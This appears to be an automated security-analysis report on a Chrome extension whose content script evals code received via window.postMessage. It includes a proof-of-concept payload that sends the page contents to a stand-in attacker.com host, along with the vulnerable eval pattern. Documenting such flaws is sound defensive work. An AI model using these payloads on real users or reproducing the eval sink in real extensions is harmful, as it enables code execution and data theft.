# CoCo Analysis: fkoanpnbdofolodbnfgiigppacpkfmgb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → eval_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fkoanpnbdofolodbnfgiigppacpkfmgb/opgen_generated_files/cs_0.js
Line 526	window.addEventListener("message", function(e)
Line 530	if(e.data && e.data.cmd == 'invoke') {
Line 531	eval('('+e.data.code+')');
```

**Code:**

```javascript
// Content script (cs_0.js) - Lines 526-537
// Entry point: window.postMessage listener
window.addEventListener("message", function(e)
{
	// console.log('收到消息：', e.data);

	if(e.data && e.data.cmd == 'invoke') {
		eval('('+e.data.code+')');  // ← attacker-controlled code execution
	}

	else if(e.data && e.data.cmd == 'message') {
		tip(e.data.data);
	}
}, false);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Malicious webpage can execute arbitrary code in content script context
window.postMessage({
	cmd: 'invoke',
	code: 'alert(document.cookie)'  // Arbitrary code execution
}, '*');

// More dangerous example - steal sensitive data
window.postMessage({
	cmd: 'invoke',
	code: 'fetch("https://attacker.com/steal?data=" + encodeURIComponent(document.body.innerHTML))'
}, '*');
```

**Impact:** Arbitrary code execution in the content script context. An attacker controlling a malicious webpage can execute arbitrary JavaScript code through the eval() sink. This allows the attacker to access and exfiltrate page content, manipulate the DOM, steal cookies, and perform actions with the content script's elevated permissions. Since the content script runs on `<all_urls>` (from manifest.json), this vulnerability affects all websites the user visits.
